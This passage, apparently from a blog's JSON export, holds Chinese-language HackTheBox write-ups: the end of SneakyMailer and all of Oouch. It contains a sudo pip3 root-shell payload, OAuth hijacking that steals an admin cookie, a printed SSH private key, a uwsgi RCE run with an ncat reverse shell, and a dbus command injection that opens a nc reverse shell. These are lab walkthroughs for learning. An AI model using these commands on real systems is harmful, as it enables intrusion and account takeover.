long_description_content_type=\"text/markdown\", url=\"https://github.com/pypa/sampleproject\", packages=setuptools.find_packages(), classifiers=[ \"Programming Language :: Python :: 3\", \"License :: OSI Approved :: MIT License\", \"Operating System :: OS Independent\", ],) user flagSSH登录，得到user.txt: 提权信息123456789low@sneakymailer:~$ sudo -lsudo: unable to resolve host sneakymailer: Temporary failure in name resolutionMatching Defaults entries for low on sneakymailer: env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/binUser low may run the following commands on sneakymailer: (root) NOPASSWD: /usr/bin/pip3 可以无需密码，以root权限运行/usr/bin/pip3，那基本就是通过pip3安装恶意模块 提权参考： https://gtfobins.github.io/gtfobins/pip/ 123TF&#x3D;$(mktemp -d)echo &quot;import os; os.execl(&#39;&#x2F;bin&#x2F;sh&#39;, &#39;sh&#39;, &#39;-c&#39;, &#39;sh &lt;$(tty) &gt;$(tty) 2&gt;$(tty)&#39;)&quot; &gt; $TF&#x2F;setup.pysudo pip3 install $TF root flag提权到root，读取root.txt: 参考资料 https://pypi.org/project/pypiserver/#upload-with-setuptools https://gtfobins.github.io/gtfobins/pip/ HacktheBox SneakyMailer 10.10.10.197 Writeup - BinaryBicepshttps://binarybiceps.com/hackthebox-sneakymailer-writeup/","categories":[],"tags":[{"name":"HackTheBox","slug":"HackTheBox","permalink":"https://darkwing.moe/tags/HackTheBox/"}]},{"title":"Oouch - HackTheBox","slug":"Oouch-HackTheBox","date":"2020-07-17T06:36:57.000Z","updated":"2020-08-03T00:28:30.943Z","comments":true,"path":"2020/07/17/Oouch-HackTheBox/","link":"","permalink":"https://darkwing.moe/2020/07/17/Oouch-HackTheBox/","excerpt":"","text":"基本信息 https://www.hackthebox.eu/home/machines/profile/231 10.10.10.177 端口扫描21,22,5000,8000： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566nmap -sC -sV 10.10.10.177Starting Nmap 7.80 ( https://nmap.org ) at 2020-07-16 13:05 CSTWARNING: Service 10.10.10.177:8000 had already soft-matched rtsp, but now soft-matched sip; ignoring second valueNmap scan report for 10.10.10.177Host is up (0.23s latency).Not shown: 996 closed portsPORT STATE SERVICE VERSION21/tcp open ftp vsftpd 2.0.8 or later| ftp-anon: Anonymous FTP login allowed (FTP code 230)|_-rw-r--r-- 1 ftp ftp 49 Feb 11 19:34 project.txt| ftp-syst:| STAT:| FTP server status:| Connected to 10.10.14.32| Logged in as ftp| TYPE: ASCII| Session bandwidth limit in byte/s is 30000| Session timeout in seconds is 300| Control connection is plain text| Data connections will be plain text| At session startup, client count was 2| vsFTPd 3.0.3 - secure, fast, stable|_End of status22/tcp open ssh OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)| ssh-hostkey:| 2048 8d:6b:a7:2b:7a:21:9f:21:11:37:11:ed:50:4f:c6:1e (RSA)|_ 256 d2:af:55:5c:06:0b:60:db:9c:78:47:b5:ca:f4:f1:04 (ED25519)5000/tcp open http nginx 1.14.2| http-title: Welcome to Oouch|_Requested resource was http://10.10.10.177:5000/login?next=%2F8000/tcp open rtsp| fingerprint-strings:| FourOhFourRequest, GetRequest, HTTPOptions:| HTTP/1.0 400 Bad Request| Content-Type: text/html| Vary: Authorization| &lt;h1&gt;Bad Request (400)&lt;/h1&gt;| RTSPRequest:| RTSP/1.0 400 Bad Request| Content-Type: text/html| Vary: Authorization| &lt;h1&gt;Bad Request (400)&lt;/h1&gt;| SIPOptions:| SIP/2.0 400 Bad Request| Content-Type: text/html| Vary: Authorization|_ &lt;h1&gt;Bad Request (400)&lt;/h1&gt;|_http-title: Site doesn't have a title (text/html).|_rtsp-methods: ERROR: Script execution failed (use -d to debug)1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :SF-Port8000-TCP:V=7.80%I=7%D=7/16%Time=5F0FE03A%P=x86_64-apple-darwin18.6.SF:0%r(GetRequest,64,\"HTTP/1\\.0\\x20400\\x20Bad\\x20Request\\r\\nContent-Type:\\SF:x20text/html\\r\\nVary:\\x20Authorization\\r\\n\\r\\n&lt;h1&gt;Bad\\x20Request\\x20\\(4SF:00\\)&lt;/h1&gt;\")%r(FourOhFourRequest,64,\"HTTP/1\\.0\\x20400\\x20Bad\\x20Request\\SF:r\\nContent-Type:\\x20text/html\\r\\nVary:\\x20Authorization\\r\\n\\r\\n&lt;h1&gt;Bad\\SF:x20Request\\x20\\(400\\)&lt;/h1&gt;\")%r(HTTPOptions,64,\"HTTP/1\\.0\\x20400\\x20Bad\\SF:x20Request\\r\\nContent-Type:\\x20text/html\\r\\nVary:\\x20Authorization\\r\\n\\SF:r\\n&lt;h1&gt;Bad\\x20Request\\x20\\(400\\)&lt;/h1&gt;\")%r(RTSPRequest,64,\"RTSP/1\\.0\\x20SF:400\\x20Bad\\x20Request\\r\\nContent-Type:\\x20text/html\\r\\nVary:\\x20AuthoriSF:zation\\r\\n\\r\\n&lt;h1&gt;Bad\\x20Request\\x20\\(400\\)&lt;/h1&gt;\")%r(SIPOptions,63,\"SIPSF:/2\\.0\\x20400\\x20Bad\\x20Request\\r\\nContent-Type:\\x20text/html\\r\\nVary:\\xSF:20Authorization\\r\\n\\r\\n&lt;h1&gt;Bad\\x20Request\\x20\\(400\\)&lt;/h1&gt;\");Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernelService detection performed. Please report any incorrect results at https://nmap.org/submit/ .Nmap done: 1 IP address (1 host up) scanned in 66.68 seconds 2121 FTP可以匿名登录，没什么信息, 注意有个模式问题报错，自己改一下就可以： 12345678910111213141516171819202122232425262728293031➜ Oouch ftp 10.10.10.177Connected to 10.10.10.177.220 qtc's development serverName (10.10.10.177:miao): anonymous230 Login successful.Remote system type is UNIX.Using binary mode to transfer files.ftp&gt; ls500 Illegal PORT command.ftp: bind: Address already in useftp&gt; quote pasv227 Entering Passive Mode (10,10,10,177,191,185).ftp&gt; passivePassive mode on.ftp&gt; ls227 Entering Passive Mode (10,10,10,177,184,218).150 Here comes the directory listing.-rw-r--r-- 1 ftp ftp 49 Feb 11 19:34 project.txt226 Directory send OK.ftp&gt; get project.txtlocal: project.txt remote: project.txt227 Entering Passive Mode (10,10,10,177,183,137).150 Opening BINARY mode data connection for project.txt (49 bytes).226 Transfer complete.49 bytes received in 0.00 secs (354.4560 kB/s)ftp&gt; exit221 Goodbye.➜ Oouch cat project.txtFlask -&gt; ConsumerDjango -&gt; Authorization Servers 8000 直接访问是一个错误页面 5000简单的注册登录： 随意注册登录，如果500那就是服务炸了，reset一下机器： 目录扫描1234567891011121314151617181920212223242526➜ Oouch gobuster dir -u http://10.10.10.177:5000/ -w /usr/share/wordlists/seclists/Discovery/Web-Content/common.txt===============================================================Gobuster v3.0.1by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@_FireFart_)===============================================================[+] Url: http://10.10.10.177:5000/[+] Threads: 10[+] Wordlist: /usr/share/wordlists/seclists/Discovery/Web-Content/common.txt[+] Status codes: 200,204,301,302,307,401,403[+] User Agent: gobuster/3.0.1[+] Timeout: 10s===============================================================2020/07/11 15:41:16 Starting gobuster===============================================================/about (Status: 302)/contact (Status: 302)/documents (Status: 302)/home (Status: 302)/login (Status: 200)/logout (Status: 302)/oauth (Status: 302)/profile (Status: 302)/register (Status: 200)===============================================================2020/07/11 15:43:01 Finished=============================================================== oauth这里会有一些新的子域名，自己加hosts： 110.10.10.177 oouch.htb consumer.oouch.htb authorization.oouch.htb 点击第一个connect链接，登录后会跳转到下面这个： 所以整个系统应该就是oauth相关，5000是flask，8000是Django，我们应该以某种方式将管理员账号与我们自己的账号绑定。 oauth安全相关资料： Attacking the OAuth Protocol - Dhaval Kapilhttps://dhavalkapil.com/blogs/Attacking-the-OAuth-Protocol/ document提示只有管理员可以查看，所以就是需要某种方式得到管理员账号权限： concat这里是提交内容管理员账号会自动查看，可能存在SSRF： 攻击oauth 首先在Authorization.oouch.htb:8000注册一个账号： 首先在这里注册一个账号： 访问http://consumer.oouch.htb:5000/oauth/connect，进行connect，会在connect和authorize两个请求后跳转到确认界面： confirm authorize Get token,注意这个请求需要直接drop掉，因为token只有一次有效，我们保存后直接drop掉请求 SSRF，将第4步的请求URL通过contact发给管理员 访问http://consumer.oouch.htb:5000/oauth/login，看到一个新的确认界面, 这里有个坑，不要直接点页面的链接，显示是login实际是connect，自己复制login浏览器访问： 然后查看profile，发现我们的账号和qtc账号connect，qtc账号是管理员，可以查看documents： dev_access.txt develop:supermegasecureklarabubu123! -&gt; Allows application registration. o_auth_notes.txt /api/get_user -&gt; user data. oauth/authorize -&gt; Now also supports GET method. todo.txt Chris mentioned all users could obtain my ssh key. Must be a joke… 注意todo.txt内容，提示信息，下一步就是想办法获取ssh key connect12345678910GET /oauth/connect HTTP/1.1Host: consumer.oouch.htb:5000User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:77.0) Gecko/20100101 Firefox/77.0Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8Accept-Language: zh-CN,en-US;q=0.7,en;q=0.3Accept-Encoding: gzip, deflateConnection: closeCookie: session=.eJwlj81qAzEMhF_F-ByKLf8qT9F7CUG2pezSNFvWm1PIu1fQkxCj-Wb0sle501x42vPXy5pDh_3hOenG9mQ_70yTzX27mfVhjs1Q7yqaY1mn-dWbD3t5X04K2Xku9nzsT9ZtHfZsa-sx9IA5Z4oDiKH6mjxEkJF7dIOHQx8kIYKT1DCgy76nWHzmXDjFVBFLHMjdI4hIKzFCSi0Au1gxSA4SQAHEJdMo1Lp0RVIqXYLW73OX67F980P7uNI4KdrlRugHxwqFfa6aRNycWgUAo1ffc_L-_wTY9x86CVVn.Xw_qeQ.OhEurQbmZ8KQ1QpEkIULM48hEQIUpgrade-Insecure-Requests: 1DNT: 1 authorize12345678910GET /oauth/authorize/?client_id=UDBtC8HhZI18nJ53kJVJpXp4IIffRhKEXZ0fSd82&amp;response_type=code&amp;redirect_uri=http://consumer.oouch.htb:5000/oauth/connect/token&amp;scope=read HTTP/1.1Host: authorization.oouch.htb:8000User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:77.0) Gecko/20100101 Firefox/77.0Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8Accept-Language: zh-CN,en-US;q=0.7,en;q=0.3Accept-Encoding: gzip, deflateConnection: closeCookie: csrftoken=HmhQQiCSvm9A3pArOk2xBIg0E6UwSjMthmB6ezKXklnfOrKaxqYx00Ca6uhiSeQF; sessionid=s7blde1d26stukpb5uobfu211fi186rkUpgrade-Insecure-Requests: 1DNT: 1 confirm authorize12345678910111213141516POST /oauth/authorize/?client_id=UDBtC8HhZI18nJ53kJVJpXp4IIffRhKEXZ0fSd82&amp;response_type=code&amp;redirect_uri=http://consumer.oouch.htb:5000/oauth/connect/token&amp;scope=read HTTP/1.1Host: authorization.oouch.htb:8000User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:77.0) Gecko/20100101 Firefox/77.0Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8Accept-Language: zh-CN,en-US;q=0.7,en;q=0.3Accept-Encoding: gzip, deflateContent-Type: application/x-www-form-urlencodedContent-Length: 266Origin: http://authorization.oouch.htb:8000Connection: closeReferer: http://authorization.oouch.htb:8000/oauth/authorize/?client_id=UDBtC8HhZI18nJ53kJVJpXp4IIffRhKEXZ0fSd82&amp;response_type=code&amp;redirect_uri=http://consumer.oouch.htb:5000/oauth/connect/token&amp;scope=readCookie: csrftoken=HmhQQiCSvm9A3pArOk2xBIg0E6UwSjMthmB6ezKXklnfOrKaxqYx00Ca6uhiSeQF; sessionid=s7blde1d26stukpb5uobfu211fi186rkUpgrade-Insecure-Requests: 1DNT: 1csrfmiddlewaretoken=Soc7lOdGu6tzSqeevTL2ZljQztn8Bma1U3PXUCZ1UrkjIRUMcOC0ZkZeIQrkyA4o&amp;redirect_uri=http%3A%2F%2Fconsumer.oouch.htb%3A5000%2Foauth%2Fconnect%2Ftoken&amp;scope=read&amp;client_id=UDBtC8HhZI18nJ53kJVJpXp4IIffRhKEXZ0fSd82&amp;state=&amp;response_type=code&amp;allow=Authorize token1234567891011GET /oauth/connect/token?code=JWPBsJgZk9GsyqvzANgTg02qrdvXhz HTTP/1.1Host: consumer.oouch.htb:5000User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:77.0) Gecko/20100101 Firefox/77.0Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8Accept-Language: zh-CN,en-US;q=0.7,en;q=0.3Accept-Encoding: gzip, deflateReferer: http://authorization.oouch.htb:8000/oauth/authorize/?client_id=UDBtC8HhZI18nJ53kJVJpXp4IIffRhKEXZ0fSd82&amp;response_type=code&amp;redirect_uri=http://consumer.oouch.htb:5000/oauth/connect/token&amp;scope=readConnection: closeCookie: session=.eJwlj81qAzEMhF_F-ByKLf8qT9F7CUG2pezSNFvWm1PIu1fQkxCj-Wb0sle501x42vPXy5pDh_3hOenG9mQ_70yTzX27mfVhjs1Q7yqaY1mn-dWbD3t5X04K2Xku9nzsT9ZtHfZsa-sx9IA5Z4oDiKH6mjxEkJF7dIOHQx8kIYKT1DCgy76nWHzmXDjFVBFLHMjdI4hIKzFCSi0Au1gxSA4SQAHEJdMo1Lp0RVIqXYLW73OX67F980P7uNI4KdrlRugHxwqFfa6aRNycWgUAo1ffc_L-_wTY9x86CVVn.Xw_qeQ.OhEurQbmZ8KQ1QpEkIULM48hEQIUpgrade-Insecure-Requests: 1DNT: 1 目录扫描1234567gobuster dir -u http:&#x2F;&#x2F;authorization.oouch.htb:8000&#x2F;oauth&#x2F; -w &#x2F;usr&#x2F;share&#x2F;wordlists&#x2F;seclists&#x2F;Discovery&#x2F;Web-Content&#x2F;common.txt&#x2F;applications (Status: 301)gobuster dir -u http:&#x2F;&#x2F;authorization.oouch.htb:8000&#x2F;oauth&#x2F;applications -w &#x2F;usr&#x2F;share&#x2F;wordlists&#x2F;seclists&#x2F;Discovery&#x2F;Web-Content&#x2F;common.txt&#x2F;register (Status: 301)develop:supermegasecureklarabubu123! register需要认证，可以使用前面document中得到的账号密码： SSRFnew application新建一个application，重定向URL设置为我们自己的监听server： 构造URL根据oauth2协议规范构造url： 1http:&#x2F;&#x2F;authorization.oouch.htb:8000&#x2F;oauth&#x2F;authorize&#x2F;?client_id&#x3D;ue1FGRi1HRlRUmikHZy3oAxeeAowHQGB2KFH8LgA&amp;redirect_uri&#x3D;http:&#x2F;&#x2F;10.10.14.32:7777&amp;grant_type&#x3D;authorization_code&amp;client_secret&#x3D;VgiDaPFrnhFB9BZDKhujIsHHLhX4KReSKGdBrRQkLVx3RZwKxux1Ej2w6giDHmNkqeSFyPtvJdkcom6NfBfr9WFavBYGoMPj5wB58g14iSdB5EKQU2psXRQsreLOh8Aa SSRF将构造的URL发给管理员，监听接收到管理员cookie： 12345678910111213nc -lvvp 7777Listening on any address 7777 (cbt)Connection from 10.10.10.177:48784GET /?error=invalid_request&amp;error_description=Missing+response_type+parameter. HTTP/1.1Host: 10.10.14.32:7777User-Agent: python-requests/2.21.0Accept-Encoding: gzip, deflateAccept: */*Connection: keep-aliveCookie: sessionid=zn0t5p80u92kej7o7mmenhwygrntein6;Total received bytes: 273Total sent bytes: 0 qtc cookie修改cookie，刷新，现在我们是qtc用户身份： API现在我们可以尝试以qtc用户身份通过API获取信息，首先需要获得access token： 这里需要用client_credentials的application,用自己的账号修改类型后再切到qtc账号： 12curl -X POST &#39;http:&#x2F;&#x2F;authorization.oouch.htb:8000&#x2F;oauth&#x2F;token&#x2F;&#39; -H &quot;Content-Type: application&#x2F;x-www-form-urlencoded&quot; --data &quot;grant_type&#x3D;client_credentials&amp;client_id&#x3D;ue1FGRi1HRlRUmikHZy3oAxeeAowHQGB2KFH8LgA&amp;client_secret&#x3D;VgiDaPFrnhFB9BZDKhujIsHHLhX4KReSKGdBrRQkLVx3RZwKxux1Ej2w6giDHmNkqeSFyPtvJdkcom6NfBfr9WFavBYGoMPj5wB58g14iSdB5EKQU2psXRQsreLOh8Aa&quot; -L -s&#123;&quot;access_token&quot;: &quot;DZMcOVlYaBFgJ0j6AApUgzSb79PArE&quot;, &quot;expires_in&quot;: 600, &quot;token_type&quot;: &quot;Bearer&quot;, &quot;scope&quot;: &quot;read write&quot;&#125;% get ssh key使用这个token通过API获取ssh key： http://authorization.oouch.htb:8000/api/get_ssh/?access_token=DZMcOVlYaBFgJ0j6AApUgzSb79PArE ssh key格式比较坑，修复后： 1234567891011121314151617181920212223242526272829303132333435363738-----BEGIN OPENSSH PRIVATE KEY-----b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABlwAAAAdzc2gtcnNhAAAAAwEAAQAAAYEAqQvHuKA1i28D1ldvVbFB8PL7ARxBNy8Ve&#x2F;hfW&#x2F;V7cmEHTDTJtmk7LJZzc1djIKKqYL8eB0ZbVpSmINLfJ2xnCbgRLyo5aEbj1Xw+fdr9&#x2F;yK1Ie55KQjgnghNdgreZeDWnTfBrY8sd18rwBQpxLphpCR367M9Muw6K31tJhNlIwKtOWy5oDo&#x2F;O88UnqIqaiJVZFDpHJ&#x2F;u0uQc8zqqdHR1HtVVbXiM3u5M&#x2F;6tb3j98Rx7swrNECt2WyrmYorYLoTvGK4frIvbv8lvztG48WrsIEyvSEKNqNUfnRGFYUJZUMridN5iOyavU7iY0loMrn2xikuVrIeUcXRblzeFwTaxkkChXKgYdnWHs+15qrDmZTzQYgamx7+vD13cTuZqKmHkRFEPDfa&#x2F;PXloKIqi2jAtZVbgiVqnS0F+4BxE2T38q&#x2F;&#x2F;G513iR1EXuPzh4jQIBGDCciq5VNs3t0un+gd5Ae40esJKeVcpPi1sKFO7cFyhQ8EME2DbgMxcAZCj0vypbOeWlAAAFiA7BX3cOwV93AAAAB3NzaC1yc2EAAAGBAKkLx7igNYtvA9ZXb1WxQfDy+wEcQTcvFXv4X1v1e3JhB0w0ybZpOyyWc3NXYyCiqmC&#x2F;HgdGW1aUpiDS3ydsZwm4ES8qOWhG49V8Pn3a&#x2F;f8itSHueSkI4J4ITXYK3mXg1p03wa2PLHdfK8AUKcS6YaQkd+uzPTLsOit9bSYTZSMCrTlsuaA6PzvPFJ6iKmoiVWRQ6Ryf7tLkHPM6qnR0dR7VVW14jN7uTP+rW94&#x2F;fEce7MKzRArdlsq5mKK2C6E7xiuH6yL27&#x2F;Jb87RuPFq7CBMr0hCjajVH50RhWFCWVDK4nTeYjsmr1O4mNJaDK59sYpLlayHlHF0W5c3hcE2sZJAoVyoGHZ1h7Pteaqw5mU80GIGpse&#x2F;rw9d3E7maiph5ERRDw32vz15aCiKotowLWVW4Ilap0tBfuAcRNk9&#x2F;Kv&#x2F;xudd4kdRF7j84eI0CARgwnIquVTbN7dLp&#x2F;oHeQHuNHrCSnlXKT4tbChTu3BcoUPBDBNg24DMXAGQo9L8qWznlpQAAAAMBAAEAAAGBAJ5OLtmiBqKt8tz+AoAwQD1hflfa2uPPzwHKZZrbd6B0Zv4hjSiqwUSPHEzOcEE2s&#x2F;Fn6LoNVCnviOfCMkJcDN4YJteRZjNV97SL5oW72BLesNu21HXuH1M&#x2F;GTNLGFw1wyV1+oULSCv9zx3QhBD8LcYmdLsgnlYazJq&#x2F;mcCHdzXjIs9dFzSKd38N&#x2F;RRVbvz3bBpGfxdUWrXZ85Z&#x2F;wPLPwIKAa8DZnKqEZU0kbyLhNwPvXO80K6s1OipcxijR7HAwZW3haZ6k2NiXVIZC&#x2F;m&#x2F;WxSVO6x8zli7mUqpik1VZ3X9HWH9ltztESlvBYHGgukRO&#x2F;OFr7VOd&#x2F;EpqAPrdH4xtm0wM02k+qVMlKId9uv0KtbUQHV2kvYIiCIYp&#x2F;Mga78V3INxpZJvdCdaazU5sujV7FEAksUYxbkYGaXeexhrF6SfyMpOc2cB&#x2F;rDms7KYYFL&#x2F;4Rau4TzmN5ey1qfApzYC981Yy4tfFUz8aUfKERomy9aYdcGurLJjvi0r84nK3ZpqiHQAAAMBS+Fx1SFnQvV&#x2F;c5dvvx4zk1Yi3k3HCEvfWq5NG5eMsj+WRrPcCyc7oAvb&#x2F;TzVn&#x2F;EitytcEfjDKSNmvr2SzUa76Uvpr12MDMcepZ5xKblUkwTzAAannbbaxbSkyeRFh3k7w5y3N3M5jsz47&#x2F;4WTxuEwK0xoabNKbSk+plBU4y2b2moUQTXTHJcjrlwTMXTV2k5Qr6uCyvQENZGDRtXkgLd4XMed+UCmjpC92&#x2F;Ubjc+g&#x2F;qVhuFcHEs9LDTG9tAZtgAEAAADBANMRIDSfMKdc38iljKbnPU6MxqGII7gKKTrC3MmheAr7DG7FPaceGPHw3n8KEl0iP1wnyDjFnlrs7JR2OgUzs9dPU3FW6pLMOceN1tkWj+&#x2F;8W15XW5J31AvD8dnb950rdt5lsyWse8+APAmBhpMzRftWh86wEQL28qajGxNQ12KeqYG7CRpTDkgscTEEbAJEXAy1zhp+h0q51RbFLVkkl4mmjHzz0&#x2F;6QxltV7VTC+G7uEeFT24oYr4swNZ+xahTGvwAAAMEAzQiSBu4dA6BMieRFl3MdqYuvK58lj0NM2lVKmE7TTJTRYYhjA0vrE&#x2F;kNlVwPIY6YQaUnAsD7MGrWpT14AbKiQfnU7JyNOl5B8E10CoG&#x2F;0EInDfKoStwI9KV7&#x2F;RG6U7mYAosyyeN+MHdObc23YrENAwpZMZdKFRnro5xWTSdQqoVNzYClNLoH22l81l3minmQ2+Gy7gWMEgTx&#x2F;wKkse36MHo7n4hwaTlUz5ujuTVzS+57HupbwkIEkgsoEGTkznCbAAAADnBlbnRlc3RlckBrYWxpAQIDBA&#x3D;&#x3D;-----END OPENSSH PRIVATE KEY----- user flag使用这个ssh key，以qtc用户连接，得到user.txt: 搜集信息查看ip发现docker，172.17.0.1/16和172.18.0.1/16两个网段： 1234567891011121314151617181920212223242526272829303132333435363738394041qtc@oouch:~$ ip addr1: lo: &lt;LOOPBACK,UP,LOWER_UP&gt; mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000 link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00 inet 127.0.0.1/8 scope host lo valid_lft forever preferred_lft forever inet6 ::1/128 scope host valid_lft forever preferred_lft forever2: ens34: &lt;BROADCAST,MULTICAST,UP,LOWER_UP&gt; mtu 1500 qdisc pfifo_fast state UP group default qlen 1000 link/ether 00:50:56:b9:ad:af brd ff:ff:ff:ff:ff:ff inet 10.10.10.177/24 brd 10.10.10.255 scope global ens34 valid_lft forever preferred_lft forever inet6 dead:beef::250:56ff:feb9:adaf/64 scope global dynamic mngtmpaddr valid_lft 86195sec preferred_lft 14195sec inet6 fe80::250:56ff:feb9:adaf/64 scope link valid_lft forever preferred_lft forever3: docker0: &lt;NO-CARRIER,BROADCAST,MULTICAST,UP&gt; mtu 1500 qdisc noqueue state DOWN group default link/ether 02:42:57:4d:fe:8d brd ff:ff:ff:ff:ff:ff inet 172.17.0.1/16 brd 172.17.255.255 scope global docker0 valid_lft forever preferred_lft forever4: br-cc6c78e0c7d0: &lt;BROADCAST,MULTICAST,UP,LOWER_UP&gt; mtu 1500 qdisc noqueue state UP group default link/ether 02:42:a5:93:e9:a4 brd ff:ff:ff:ff:ff:ff inet 172.18.0.1/16 brd 172.18.255.255 scope global br-cc6c78e0c7d0 valid_lft forever preferred_lft forever inet6 fe80::42:a5ff:fe93:e9a4/64 scope link valid_lft forever preferred_lft forever6: vethceecf07@if5: &lt;BROADCAST,MULTICAST,UP,LOWER_UP&gt; mtu 1500 qdisc noqueue master br-cc6c78e0c7d0 state UP group default link/ether 1a:6d:1b:fe:5e:6f brd ff:ff:ff:ff:ff:ff link-netnsid 1 inet6 fe80::186d:1bff:fefe:5e6f/64 scope link valid_lft forever preferred_lft forever8: veth91c935d@if7: &lt;BROADCAST,MULTICAST,UP,LOWER_UP&gt; mtu 1500 qdisc noqueue master br-cc6c78e0c7d0 state UP group default link/ether aa:21:f6:24:9c:54 brd ff:ff:ff:ff:ff:ff link-netnsid 3 inet6 fe80::a821:f6ff:fe24:9c54/64 scope link valid_lft forever preferred_lft forever10: vethb848da6@if9: &lt;BROADCAST,MULTICAST,UP,LOWER_UP&gt; mtu 1500 qdisc noqueue master br-cc6c78e0c7d0 state UP group default link/ether 22:d2:ed:91:5d:e3 brd ff:ff:ff:ff:ff:ff link-netnsid 0 inet6 fe80::20d2:edff:fe91:5de3/64 scope link valid_lft forever preferred_lft forever12: veth039163f@if11: &lt;BROADCAST,MULTICAST,UP,LOWER_UP&gt; mtu 1500 qdisc noqueue master br-cc6c78e0c7d0 state UP group default link/ether 6a:b9:9a:01:dd:04 brd ff:ff:ff:ff:ff:ff link-netnsid 2 inet6 fe80::68b9:9aff:fe01:dd04/64 scope link valid_lft forever preferred_lft forever 内网探测直接探测22端口： 123for IP in &#123;1..255&#125;; do timeout 1 bash -c \"&lt;/dev/tcp/172.17.0.$IP/22 &amp;&gt;/dev/null\" &amp;&amp; echo \"IP $IP is open\"done 探测发现172.18.0.3开放(可能不同，比如参考资料是172.18.0.2，我打的时候是172.18.0.3)，直接用当前qtc用户私钥即可登录： code 有个code目录，应该是前面5000和8000端口的web代码： dbus外面有一个note ,里面有提示信息： 12qtc@oouch:~$ cat .note.txtImplementing an IPS using DBus and iptables == Genius? docker里flask有相关代码实现： 1234qtc@aeb4525789d8:/code$ cat oouch/routes.py | grep dbusimport dbus bus = dbus.SystemBus() block_iface = dbus.Interface(block_object, dbus_interface='htb.oouch.Block') 根据代码中dbus接口信息，尝试使用dbus-send,没有权限： 123dbus-send --system --print-reply --dest&#x3D;htb.oouch.Block &#x2F;htb&#x2F;oouch&#x2F;Block htb.oouch.Block.Block &quot;string:;rm &#x2F;tmp&#x2F;.0; mkfifo &#x2F;tmp&#x2F;.0; cat &#x2F;tmp&#x2F;.0 | &#x2F;bin&#x2F;bash -i 2&gt;&amp;1 | nc 172.18.0.1 7777 &gt;&#x2F;tmp&#x2F;.0;&quot;Error org.freedesktop.DBus.Error.AccessDenied: Rejected send message, 1 matched rules; type&#x3D;&quot;method_call&quot;, sender&#x3D;&quot;:1.297&quot; (uid&#x3D;1000 pid&#x3D;6674 comm&#x3D;&quot;dbus-send --system --print-reply --dest&#x3D;htb.oouch.&quot;) interface&#x3D;&quot;htb.oouch.Block&quot; member&#x3D;&quot;Block&quot; error name&#x3D;&quot;(unset)&quot; requested_reply&#x3D;&quot;0&quot; destination&#x3D;&quot;htb.oouch.Block&quot; (uid&#x3D;0 pid&#x3D;2600 comm&#x3D;&quot;&#x2F;root&#x2F;dbus-server &quot;) 查看外面配置,确认是需要www-root用户： 12345678910111213141516171819qtc@oouch:~$ cat /etc/dbus-1/system.d/htb.oouch.Block.conf&lt;?xml version=\"1.0\" encoding=\"UTF-8\"?&gt; &lt;!-- -*- XML -*- --&gt;&lt;!DOCTYPE busconfig PUBLIC \"-//freedesktop//DTD D-BUS Bus Configuration 1.0//EN\" \"http://www.freedesktop.org/standards/dbus/1.0/busconfig.dtd\"&gt;&lt;busconfig&gt; &lt;policy user=\"root\"&gt; &lt;allow own=\"htb.oouch.Block\"/&gt; &lt;/policy&gt; &lt;policy user=\"www-data\"&gt; &lt;allow send_destination=\"htb.oouch.Block\"/&gt; &lt;allow receive_sender=\"htb.oouch.Block\"/&gt; &lt;/policy&gt;&lt;/busconfig&gt; uswgi进程可以看到uwsgi,版本是2.0.17.1： 12qtc@aeb4525789d8:/code$ uwsgi --version2.0.17.1 搜索发现相关漏洞及exp： webcgi-exploits/uwsgi-rce-zh.md at master · wofeiwo/webcgi-exploitshttps://github.com/wofeiwo/webcgi-exploits/blob/master/python/uwsgi-rce-zh.md https://github.com/wofeiwo/webcgi-exploits/blob/master/python/uwsgi_exp.py uwsgi exp把需要的东西都传到docker里，外面监听端口： 12345678qtc@aeb4525789d8:/tmp$ ls -altotal 2864drwxrwxrwt 1 root root 4096 Jul 17 05:54 .drwxr-xr-x 1 root root 4096 Feb 25 12:33 ..-rwxr-xr-x 1 qtc qtc 2914424 Jul 17 05:52 ncat-rwxr-xr-x 1 qtc qtc 4334 Jul 17 05:54 uswgi.pysrw-rw-rw- 1 www-data www-data 0 Jul 17 04:35 uwsgi.socketqtc@aeb4525789d8:/tmp$ python uswgi.py -m unix -u /tmp/uwsgi.socket -c \"/tmp/ncat -e /bin/bash 172.18.0.1 7777\" 外面得到docker的www-root用户shell： dbus exploit get root flag然后再开一个监听，用www-root的shell执行dbus-send,得到root权限shell,读取root.txt： 1dbus-send --system --print-reply --dest&#x3D;htb.oouch.Block &#x2F;htb&#x2F;oouch&#x2F;Block htb.oouch.Block.Block &quot;string:;rm &#x2F;tmp&#x2F;.0; mkfifo &#x2F;tmp&#x2F;.0; cat &#x2F;tmp&#x2F;.0 | &#x2F;bin&#x2F;bash -i 2&gt;&amp;1 | nc 172.18.0.1 7778 &gt;&#x2F;tmp&#x2F;.0;&quot; 参考资料 Attacking the OAuth Protocol - Dhaval Kapilhttps://dhavalkapil.com/blogs/Attacking-the-OAuth-Protocol/ webcgi-exploits/uwsgi-rce-zh.md at master · wofeiwo/webcgi-exploitshttps://github.com/wofeiwo/webcgi-exploits/blob/master/python/uwsgi-rce-zh.md https://github.com/wofeiwo/webcgi-exploits/blob/master/python/uwsgi_exp.py [HTB] Ooch writeup – Phantom InfoSechttps://phantominfosec.wordpress.com/2020/04/02/htb-ooch-writeup/ Hackthebox oouch machine walkthrough | htb oouch machine writeup - 